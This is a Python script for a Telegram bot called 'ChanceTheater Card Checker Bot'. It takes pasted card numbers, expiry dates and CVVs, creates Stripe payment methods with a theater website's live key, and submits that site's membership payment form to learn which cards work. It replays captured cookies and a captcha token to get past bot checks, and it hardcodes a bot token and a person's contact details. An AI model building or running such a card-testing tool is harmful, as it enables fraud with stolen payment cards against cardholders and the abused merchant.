import telebot
import requests
import re
import time

BOT_TOKEN = "7018443911:AAFP7YgMlc03URuqMUv-_VzysmewC0vt8jM"
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_PAYMENT_METHOD_URL = "https://api.stripe.com/v1/payment_methods"
FINAL_FORM_URL = "https://chancetheater.com/wp/wp-admin/admin-ajax.php"

HEADERS_STRIPE = {
    "content-type": "application/x-www-form-urlencoded",
    "accept": "application/json",
    "origin": "https://chancetheater.com",
    "referer": "https://chancetheater.com/membership-form/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
}

HEADERS_FINAL = {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryhR4xhAq7JgM4inLB",
    "cookie": "PHPSESSID=217e7a4210465860036d3dc50c40d851; _gcl_au=1.1.598876553.1746261261; _fbp=fb.1.1746261260870.580309133473345222; gaVisitorUuid=770da14e-5d39-4b4d-a5a8-2b3070d3943d; _wpfuuid=a87f5cca-1ecf-45b8-825f-beeb941e666f; _gid=GA1.2.319886946.1746261261; optiMonkClientId=5f4cc74c-9cb8-6702-ec56-3dcf85e524d5; optiMonkSession=1746261261; csrf_token=ac0232a4-c0de-45b1-a9d3-4dd2d186ede0; __stripe_mid=c1df49a5-684a-4c57-a7f3-a02335f1a5f4a2ce12; __stripe_sid=7cc42dba-e56d-42c8-8cc5-c2836427049cad7f23; cf_clearance=4.mQWqdipfN9gr0C1UWvzf9gW6cenls5bZ55NF5fwUQ-1746261315-1.2.1.1-uEpJpJNq8V1fA_uR7gIKEjJ5ToAbH1amKZXuDw.6Pj6PNiliEcFrN8DFbYz3qZWOvLKFHK0w8y2qa.w0YBnq2.T89o67U0_YiW__HY15zvVmJVzJbO0I7qY2bs6G9X4f_I7QI8dAuamE4_cNU9IuK4FDgURwJRxDn2Z8FiiaS9ax3prK7YSk7xFX.c3Jr_PbNW5PS7Jj6ZDElo9FHyFaOccYAHLkVF.KHNDMk3NtErmH8g53352cl24Poe9RKo_USnXuNhwrJjYza_njjyWLK7EQudm5OUAO.fNrnbIIrVggF5.JaZe4UAUOYkiCO.5h7v2D9stt7VKCqHKsabsYSaom0Jj7jA4fw2tCtXAoIiv5ODx_e6XeewWy3fuxfHJA; cfzs_google-analytics_v4=%7B%22VGST_pageviewCounter%22%3A%7B%22v%22%3A%222%22%7D%7D; optiMonkClient=N4IgTAjBAMDsDMIBcoDGBDZwC+AaEAZgG7ISwAsAbGJRDRPgDYlJlX3wQAcAdNAKyx8AOwD2ABxZhs2IA===; _ga=GA1.2.2062418968.1746261260; cfz_google-analytics_v4=%7B%22VGST_engagementDuration%22%3A%7B%22v%22%3A%220%22%2C%22e%22%3A1777797392978%7D%2C%22VGST_engagementStart%22%3A%7B%22v%22%3A1746261393540%2C%22e%22%3A1777797393404%7D%2C%22VGST_counter%22%3A%7B%22v%22%3A%224%22%2C%22e%22%3A1777797392978%7D%2C%22VGST_ga4sid%22%3A%7B%22v%22%3A%22901381343%22%2C%22e%22%3A1746263192978%7D%2C%22VGST_session_counter%22%3A%7B%22v%22%3A%221%22%2C%22e%22%3A1777797392978%7D%2C%22VGST_ga4%22%3A%7B%22v%22%3A%229cd0c2b8-0e6d-477d-891f-24995d18106f%22%2C%22e%22%3A1777797392978%7D%2C%22VGST_let%22%3A%7B%22v%22%3A%221746261392978%22%2C%22e%22%3A1777797392978%7D%7D; _ga_6YT7YRHLXP=GS1.1.1746261260.1.1.1746261414.60.0.0",
    "origin": "https://chancetheater.com",
    "priority": "u=1, i",
    "referer": "https://chancetheater.com/membership-form/",
    "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    "sec-ch-ua-arch": "x86",
    "sec-ch-ua-bitness": "64",
    "sec-ch-ua-full-version": "135.0.7049.116",
    "sec-ch-ua-full-version-list": '"Google Chrome";v="135.0.7049.116", "Not-A.Brand";v="8.0.0.0", "Chromium";v="135.0.7049.116"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-model": "",
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": "19.0.0",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest"
}

def parse_card(card_text):
    pattern = r"^\s*(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\s*$"
    match = re.match(pattern, card_text)
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv

def get_payment_method(cc, mm, yy, cvv):
    data = {
        "type": "card",
        "billing_details[name]": "John Doe",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": "df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59",
        "muid": "c1df49a5-684a-4c57-a7f3-a02335f1a5f4a2ce12",
        "sid": "7cc42dba-e56d-42c8-8cc5-c2836427049cad7f23",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/ca98f11090; stripe-js-v3/ca98f11090; card-element",
        "referrer": "https://chancetheater.com",
        "time_on_page": "98633",
        "key": "pk_live_514e8gjGBnfOyn04LBHjyFsg7jcN0plUUQyAyk3WDFTWv1SZ9Ghm9Vlz4KEHTJsZwWpLSn4epFnQXQFCZV47r9Saj00Yk3G0rVO",
        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiaDhYM3JRcFJZdHpTd2Vsckk5YWdzNm5xZzlOQm55dEh0TXUzR2liVjYwZHUyRm1WcStBTlVNN1g4a2VEZ3g4a2NiTGJjOGRLOS9FR2FFeUxqa2hpV3pmdTc5akdMQ0RyZ2VRc2JTbEwyR05uSkhmQmFyUGpDaFM3OC9vdERjVTBXMXJsb21BdzM3dWxKNDltZkxpbjE3Rkl5Skt6V3JxRVN6dnlCdzU4Y2NMSmM5RnR6NTV3THArRUl1d0ZOWGNCK084L1JkeVdSdlNoL1BuQ1A0d0hoWEFlMHRQYlZKM0JwQmhwdVp3SWJUWm1ENDExTGg4NEV4YnJOOHkybkpka0wrVXdBMVd5bGlFVlpENCtKNkdoTllHbGxoK1FCekwwdi9td2hNdmE2VnFKL3o3OG9oZ0VLUDRIa2NwUkZXbU56M09ISnBsVlRIaU5tOXFmQklOTSt3dGUxSktkQS9ybkVWS0ZCNmVTKzlZeGFUMEYyWmpCMDN6bXBhclF4eHNrckFJTWl2YUZlWHM2MitVYnJ6ZlNWMGN4V01vYmdHWXFkaDZwQ1QxZk5hQVZBQ0xobmtkS1EyQW1oUE5JOXNSNmpTaGZ3OW10V1NHUE1nazdyZk5QdW9kdkNhK0FLbGNiejE1VHBja0s4NlhQdkFwdWZzWUxiRElCNjVKYkZ0VmNGZ09FcjBOMjQ0M2FxOEY3SFMwNktwNlNSVGRJMTNEQ1lDbFB6Y0ZsMzJJWG9wdzdPQ294WXZzTG5YWXNuNTN2NXFvbUNQOVNtZzFZR2dWMThJL2srTzRwbFl0R3pSVE4zTUhKQ0svRE9UV3VXVTlRc0lBditTQVlXOTNwMkdDQXUxUkhrYmdOTHdUekUrZ2pnZldKYit1M3NodEZiMHY0ZW1UYzFrbTczR1hFWFVhS1lHeHpIMUVOZC9veFcvTFluQ2c1djh1NGROVWRaSlVSYTZpb0dYZVprcDV0SjhRMGhSQ3NmVUFDZEpqN0VZeVVYcG5qKzlGeHVVTUJGYVNFZGRrdUhTK1pLYWpSbjR2VDdaRXdINzI3bkxBRTFWR0N3a3VrR3cvNjU0WmxNVGk4c00rOW84M3haK0NIbmFBMWc1b2xJU1N4dmJ3V2VPcDF1WmRXMnVwdWNxKzhQK1dHUXMvZW5tQm5jUTJOa1hlUUdpQlI4a2VlcG5TOGFSZFExOExzYXF3TU9XaUJOc28zSnJUWWM2MlJ0dmN3UUVQN1RDTjJUN1dMVUZ5dE84M3Y3ZXlrWjk4VGk3TmZBUU56ZzE5eUtYU0dvR0VrMjhXNWEveU42SlcrMk42KzRINEtDNEllMDVLdzVON2ZSYWVKUThQWWljcHd0aDFPa3RYcysrbTJYQjlpdEdWUm9GQWk1eWJrYmxHQ2VWRkJJVi9mZnB5SHdxNGNiaWZkS0k2a2Y3SUF6RFNBeGYrUGJTZEc2N1hpT0FUb0psWFVJRENYS3ZDTFJsUnluaTd5UjZlRW05QVphc2VDL0lOWnljYVEzSndCTXlONnFLTUVON1UvMHdxcmZQeTgwNkRoc0htOEQ5TEhMMmkxSUdHT2pENFhuN2RGNHRFdlE4WWZkWngvK1IrNjlFVEh0WXREWmxsajM5N1R0N0d0NUhPNkJKKzZaSjF5bDdEZGVpVWJIdXo5dEoxdG1sci93TDQ4bHc3Mk1zQ09DOVlGY2NWV2VJdnFDNzJpckpCVW5KOXZIVUZMdlZjbFdKZzUxKzFlaVRMQVZIc0I2Z2hIb2NTeVNtZDUwOTFNZlc5QVFuTjVGOWsybHNrUCt4VUMxa0N3SXlYdkJzTitmTXVGOUZwKzkzK1pDNGVLSXl4TnQwbnZ2WXF4WVdUSlFHT3ByQnY1ckVkaFVYUWs2T0tYS3EvSXhmYXViTFlqam1wNHdSOXZaZ0JnU2d4a1ZRMk9QZDg3VTVZYmo0clZQR05pNDhZeEF2OWNRU08rQzlPdHJRNndCSkF3RGlUSHpFdXQ4bm00V2czOUhRZ3RjTGY5Snl0RFFSL2c3aTJnTlJZb1p0NWFZMlBOckZxN1lacHJJZ25wM0dkdzU0QmxOQUVRYnZGdi9UYXdxaUZCVTZRbkJlcnZvY3I1Zy9lZ3VqWitmQmRKZkUrZWkyTTgxc2lMTW9pd2l3bngybFRqMExkcjVMNjlqeEU4VDhqZTIwM2UzeVhZUjRMc1U0ZWZUZ3JQYnp0aitZbnU5ZGtTWFNidUpSY3lYcUpKaU1BcHhsVUdlVGxVeHlvdGx5dHNvb2hnMXlSSDVkaHUzVnpuK1pmZHZrRjdtbjA3N0JLNGdXZGc1VmpUVG8yMFVVZDBEMmIyS1BVNzN5Z0U2Rmk4dGdnVXQ1YzRlYnQvNlQxQ1NiYUFPclFyVWJQWDdEZktlOXhQUjVoZ2lFWW9VRGpPNWUzdFNiOTlwVFdIRGxOT2xGTkJ2T3g2enZTcGNCd1g5ZU1tU1pTd1kvdEVuMjl6YU9tZmN1bCtIczcvaUlQNjFQT2xRZ3VBU0dzOGRVUFRmWUZVMEF4b1NLNTF5VExGWENCT0h3MEJjaXIvK1c0cm5DSTY0T3NSWFZDVE9TaDl1Z012VlFTUHBpN25FUEtEWG1neFI4VXkwMFlnZld4MjRIM1RSb2JUNWhoa3NHS2JFOTM1cUN3RlovMlRmVzVDRm1ScXBwT3V5cGN1dGRIa2daMUY2S2hUdXBEOTNhL0R1OUpNR3l1Zi90a3IvL0NldDl2YW1aMVBDZmNjVElsSnZOK1RHbVlEVUplNGNLajAxd0g2RmhlOWJLWlpJWUVBVTFLNzNzM2I2MmR6bjRoaW5mVVIzdFltTW1LOHlScVhqRzByRXk3cUkwZEdGc3lVS1F6eTB2RitITWYzWXZNRCt1TlNQT2VBd1FQUVJMQ1NvZjV2bmVDSHVUUHl4QT09IiwiZXhwIjoxNzQ2MjYxNDQwLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiM2RkNGI3NSIsInBkIjowLCJjZGF0YSI6IlArTC95TE1DK0tMQnJXR0xTZzhNbndDWVVScnU1aDMvYitNMUlOS0NMNFptOE9FUWgzcW1ZQUlVeEJzb1FRTFFTLzk5TnZyc1pCL1JFVWpKb2VWeWlYcGl5VlZUbTQvWlpYRzU4Y0xBV21YRThKenRwRGdSSFhYRFBUTUd5UEdsa2p5dWVwdlcxNUsxYmtZWEtQc0czM2t5WWhkYmk3NFhPMHNpMkxRQ2tsWmlNdEEzSWtzRWJmUWhYZG5FbzlDL25PUms3OGVBYndKQk1FZVQifQ.gpV0pb6097q-X9X8JHnfKAczFUps3ioLlca0Z19jsPQ"
    }
    try:
        resp = requests.post(STRIPE_PAYMENT_METHOD_URL, headers=HEADERS_STRIPE, data=data, timeout=30)
        resp.raise_for_status()
        json_resp = resp.json()
        pm_id = json_resp.get("id")
        return pm_id
    except Exception as e:
        return None

def build_final_form_data(pm_id):
    # This is your fixed form data, just replacing pm_ value
    return (
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][1][first]\"\r\n\r\n"
        "John\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][1][last]\"\r\n\r\n"
        "Doe\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][2]\"\r\n\r\n"
        "peshangsalam2001@gmail.com\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][25]\"\r\n\r\n"
        "+13144740104\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][15]\"\r\n\r\n"
        "No, this will include me\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][31]\"\r\n\r\n"
        "Single\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][30]\"\r\n\r\n"
        "1\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][18][first]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][18][last]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][19]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][26]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][20][first]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][20][last]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][22]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][27]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][24]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][28][]\"\r\n\r\n"
        "By checking this box, I acknowledge that Chance Membership is a 12-month commitment and will auto-renew until canceled. Canceling during the first 12 months will result in a fee of $80 per member or the remainder of the membership, whichever is less.\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][14][address1]\"\r\n\r\n"
        "198 White Horse Pike\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][14][address2]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][14][city]\"\r\n\r\n"
        "Collingswood\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][14][state]\"\r\n\r\n"
        "NJ\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][14][postal]\"\r\n\r\n"
        "08107\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[stripe-credit-card-cardname]\"\r\n\r\n"
        "John Doe\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[fields][4]\"\r\n\r\n"
        "\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[id]\"\r\n\r\n"
        "53498\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[author]\"\r\n\r\n"
        "3\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[post_id]\"\r\n\r\n"
        "13557\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[payment_method_id]\"\r\n\r\n"
        f"{pm_id}\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"wpforms[token]\"\r\n\r\n"
        "9b2a3af24f6c494ad14926c41d5aa2fc\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "wpforms_submit\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"page_url\"\r\n\r\n"
        "https://chancetheater.com/membership-form/\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"page_title\"\r\n\r\n"
        "Subscribe with one of our monthly memberships!\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"page_id\"\r\n\r\n"
        "13557\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"start_timestamp\"\r\n\r\n"
        "1746261318347\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
        "Content-Disposition: form-data; name=\"end_timestamp\"\r\n\r\n"
        "1746261417521\r\n"
        "------WebKitFormBoundaryhR4xhAq7JgM4inLB--\r\n"
    )

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 ChanceTheater Card Checker Bot\n"
        "Send cards in format:\n"
        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
        "One per line.\n"
        "Example:\n"
        "4490520007396134|01|26|745\n"
        "4242424242424242|12|25|123"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    for card in cards:
        parsed = parse_card(card)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid card format: {card}")
            continue
        cc, mm, yy, cvv = parsed

        pm_id = get_payment_method(cc, mm, yy, cvv)
        if not pm_id:
            bot.send_message(message.chat.id, f"❌ Failed to create payment method for card: {cc}|{mm}|{yy}|{cvv}")
            continue

        form_data = build_final_form_data(pm_id)
        try:
            resp = requests.post(FINAL_FORM_URL, headers=HEADERS_FINAL, data=form_data.encode(), timeout=30)
            bot.send_message(message.chat.id, f"Card: {cc}|{mm}|{yy}|{cvv}\n\nFull Response:\n{resp.text}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error submitting final form: {str(e)}")

        time.sleep(10)

bot.infinity_polling()
